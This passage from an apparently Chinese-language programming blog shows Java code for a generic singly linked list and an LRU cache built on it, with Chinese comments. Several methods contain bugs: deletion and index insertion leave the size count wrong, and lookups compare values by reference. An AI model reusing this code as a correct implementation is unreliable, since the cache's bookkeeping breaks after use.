class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.NoSuchElementException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SinglyLinkedList</span>&lt;<span class=\"title\">T</span>&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Node&lt;T&gt; head;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">SinglyLinkedList</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.head = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"keyword\">null</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 链表头部插入值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">linkFirst</span><span class=\"params\">(Node&lt;T&gt; newNode)</span></span>&#123;</span><br><span class=\"line\">        newNode.next = head.next;</span><br><span class=\"line\">        head.next = newNode;</span><br><span class=\"line\">        size++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 链表尾部插入值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">linkLast</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; newNode = <span class=\"keyword\">new</span> Node&lt;&gt;(val);</span><br><span class=\"line\">        linkLast(newNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">linkLast</span><span class=\"params\">(Node&lt;T&gt; newNode)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            p=p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p.next = newNode;</span><br><span class=\"line\">        size++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 获取头部值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">getFirst</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head.next == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> NoSuchElementException();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> head.next.val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 获取尾部值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">getLast</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; p = head.next;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p.val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 添加</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">add</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; newNode = <span class=\"keyword\">new</span> Node&lt;&gt;(val);</span><br><span class=\"line\">        linkLast(newNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 在某处索引插入</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"keyword\">int</span> index, T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; newNode = <span class=\"keyword\">new</span> Node&lt;&gt;(val);</span><br><span class=\"line\">        Node&lt;T&gt; p = node(index);</span><br><span class=\"line\">        insert(p, newNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">insert</span><span class=\"params\">(Node&lt;T&gt; p, Node&lt;T&gt; newNode)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; q = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q!=<span class=\"keyword\">null</span> &amp;&amp; q.next!=p)&#123;</span><br><span class=\"line\">            q = q.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (q == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        newNode.next = p;</span><br><span class=\"line\">        q.next = newNode;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 根据值删除某个节点</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">delete</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next !=<span class=\"keyword\">null</span> &amp;&amp; !p.next.val.equals(val))&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p.next== <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p.next = p.next.next;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 根据索引删除某结点</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">delete</span><span class=\"params\">(<span class=\"keyword\">int</span> index)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; deleteNode = node(index);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> deleteNode(deleteNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> T <span class=\"title\">deleteNode</span><span class=\"params\">(Node&lt;T&gt; deleteNode)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> T element = deleteNode.val;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next!= <span class=\"keyword\">null</span> &amp;&amp; p.next != deleteNode)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p.next == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p.next = deleteNode.next;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> element;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 根据索引获取值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">get</span><span class=\"params\">(<span class=\"keyword\">int</span> index)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (index &gt;= size || index &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IndexOutOfBoundsException(<span class=\"string\">\"Index: \"</span>+index + <span class=\"string\">\", Size: \"</span>+size);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> node(index).val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 通过value 查找对应的索引</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">indexOf</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next !=<span class=\"keyword\">null</span> &amp;&amp; p.next.val!=val)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">            index ++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p.next == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            index = -<span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> index;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">contains</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next !=<span class=\"keyword\">null</span> &amp;&amp; p.next.val!=val)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p.next != <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> Node&lt;T&gt; <span class=\"title\">node</span><span class=\"params\">(<span class=\"keyword\">int</span> index)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (index &gt;= size || index &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IndexOutOfBoundsException(<span class=\"string\">\"Index: \"</span>+index + <span class=\"string\">\", Size: \"</span>+size);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node&lt;T&gt; p = head.next;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i&lt;size)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (i == index)&#123; <span class=\"keyword\">break</span>; &#125;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">            ++i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">push</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; newNode = <span class=\"keyword\">new</span> Node&lt;&gt;(val);</span><br><span class=\"line\">        linkFirst(newNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">pop</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> unlinkedFirst();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> T <span class=\"title\">unlinkedFirst</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; first = head.next;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (first == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">\"没有元素\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> unlinkedFirst(first);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> T <span class=\"title\">unlinkedFirst</span><span class=\"params\">(Node&lt;T&gt; node)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> T element = node.val;</span><br><span class=\"line\">        head.next = head.next.next;</span><br><span class=\"line\">        node.next = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        node.val = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        size--;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> element;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 单链表反转</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">reverse</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 链表为空或者链表只有一个元素时</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head.next == <span class=\"keyword\">null</span> || size &lt;=<span class=\"number\">1</span> )&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node&lt;T&gt; p = head.next;</span><br><span class=\"line\">        Node&lt;T&gt; q = p.next;</span><br><span class=\"line\">        Node&lt;T&gt; r;</span><br><span class=\"line\">        p.next = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q !=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            r = q.next;</span><br><span class=\"line\">            q.next = p;</span><br><span class=\"line\">            p = q;</span><br><span class=\"line\">            q = r;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        head.next = p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">size</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 打印链表 example: [1, 2, 3]</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">toString</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head.next == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">\"[]\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        StringBuilder sb = <span class=\"keyword\">new</span> StringBuilder();</span><br><span class=\"line\">        sb.append(<span class=\"string\">\"[\"</span>);</span><br><span class=\"line\">        Node&lt;T&gt; p = head.next;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            sb.append(p.val).append(<span class=\"string\">\", \"</span>);</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        sb.append(p.val).append(<span class=\"string\">\"]\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sb.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Node</span>&lt;<span class=\"title\">T</span>&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> T val;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> Node&lt;T&gt; next;</span><br><span class=\"line\">        Node(T val)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.val = val;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>基于链表的LRU缓存代码：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">LRUCache</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">put</span><span class=\"params\">(T val)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\">T <span class=\"title\">get</span><span class=\"params\">(T val)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">Size</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ListLRUCache</span>&lt;<span class=\"title\">T</span>&gt; <span class=\"keyword\">implements</span> <span class=\"title\">LRUCache</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> SinglyLinkedList&lt;T&gt; lruList;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> DEFAULT_CAP=<span class=\"number\">10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 缓存容量</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> cap;</span><br><span class=\"line\">    <span class=\"comment\">// 缓存使用大小</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ListLRUCache</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>(DEFAULT_CAP);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ListLRUCache</span><span class=\"params\">(<span class=\"keyword\">int</span> cap)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.cap = cap;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.lruList = <span class=\"keyword\">new</span> SinglyLinkedList&lt;&gt;();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">put</span><span class=\"params\">(T value)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1、缓存满了</span></span><br><span class=\"line\">        <span class=\"comment\">// 如果该列表中没有该数据</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (size == cap)&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 1、缓存满了</span></span><br><span class=\"line\">            <span class=\"comment\">// 删除最后一个节点</span></span><br><span class=\"line\">            lruList.delete(size-<span class=\"number\">1</span>);</span><br><span class=\"line\">            <span class=\"comment\">// 将该数据插入到链表头部</span></span><br><span class=\"line\">            lruList.push(value);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 2、缓存未满</span></span><br><span class=\"line\">            <span class=\"comment\">// 直接在列表头部插入该数据</span></span><br><span class=\"line\">            lruList.push(value);</span><br><span class=\"line\">            size++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">get</span><span class=\"params\">(T val)</span> </span>&#123;</span><br><span class=\"line\">        T result = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (lruList.contains(val))&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 在list中,从list中获取该数据</span></span><br><span class=\"line\">            <span class=\"keyword\">int</span> index = lruList.indexOf(val);</span><br><span class=\"line\">            result = lruList.get(index);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"从缓存中获取\"</span>);</span><br><span class=\"line\">            <span class=\"comment\">// 将该节点插入到链表头部</span></span><br><span class=\"line\">            lruList.delete(index);</span><br><span class=\"line\">            lruList.push(val);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 如果该列表中没有该数据</span></span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"缓存中没有该数据！\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (size == cap)&#123;</span><br><span class=\"line\">                <span class=\"comment\">// 1、缓存满了</span></span><br><span class=\"line\">                <span class=\"comment\">// 删除最后一个节点</span></span><br><span class=\"line\">                lruList.delete(size-<span class=\"number\">1</span>);</span><br><span class=\"line\">                <span class=\"comment\">// 将该数据插入到链表头部</span></span><br><span class=\"line\">                lruList.push(val);</span><br><span class=\"line\">                System.out.println(<span class=\"string\">\"缓存已满！将该数据插入到缓存\"</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 2、缓存未满</span></span><br><span class=\"line\">                <span class=\"comment\">// 直接在列表头部插入该数据</span></span><br><span class=\"line\">                lruList.push(val);</span><br><span class=\"line\">                size++;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">\"将该数据直接插入到缓存\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// 如果有数据库，该数据从数据库中获取</span></span><br><span class=\"line\">            result = val;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">Size</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> size;</span><br><span class=\"line\">    &#125;</span><br><span 